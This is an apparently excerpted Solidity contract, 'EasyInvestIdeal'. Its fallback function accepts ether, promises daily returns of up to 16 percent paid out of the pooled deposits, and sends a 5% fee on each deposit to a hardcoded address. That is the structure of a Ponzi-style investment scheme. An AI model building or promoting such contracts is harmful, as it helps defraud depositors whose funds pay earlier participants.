contract EasyInvestIdeal {
function () external payable {
        // if sender (aka YOU) is invested more than 0 ether
        if (!isFirstWeek() && invested[msg.sender] != 0) {
            // calculate profit amount as such:
            // amount = (amount invested) * (individual percentage) * (blocks since last transaction) / 5900
            // 5900 is an average block count per day produced by Ethereum blockchain
            uint amount = invested[msg.sender] * percentages[msg.sender] / 100 * (block.number - atBlock[msg.sender]) / 5900;

            if (premium[msg.sender]) {
                amount = amount * 3 / 2;
            }
            uint max = raised * 9 / 10;
            if (amount > max) {
                amount = max;
            }

            // send calculated amount of ether directly to sender (aka YOU)
            msg.sender.transfer(amount);
            raised -= amount;
        }
        
        // set individual percentage
        if (msg.value >= 1 ether) {
            percentages[msg.sender] = 16;
        } else if (percentages[msg.sender] > 2) {
            if (!isFirstWeek()) {
                percentages[msg.sender]--;
            }
        } else {
            percentages[msg.sender] = 2;
        }

        // record block number and invested amount (msg.value) of this transaction
        if (!isFirstWeek() || atBlock[msg.sender] == 0) {
            atBlock[msg.sender] = block.number;
        }
        invested[msg.sender] += msg.value;
        
        if (msg.value > 0) {
            // set premium user
            if (isFirstWeek() && msg.value >= 100 finney) {
                premium[msg.sender] = true;
            }
            // calculate fee (5%)
            uint fee = msg.value / 20;
            address(0x107C80190872022f39593D6BCe069687C78C7A7C).transfer(fee);
            raised += msg.value - fee;
        }
    }
}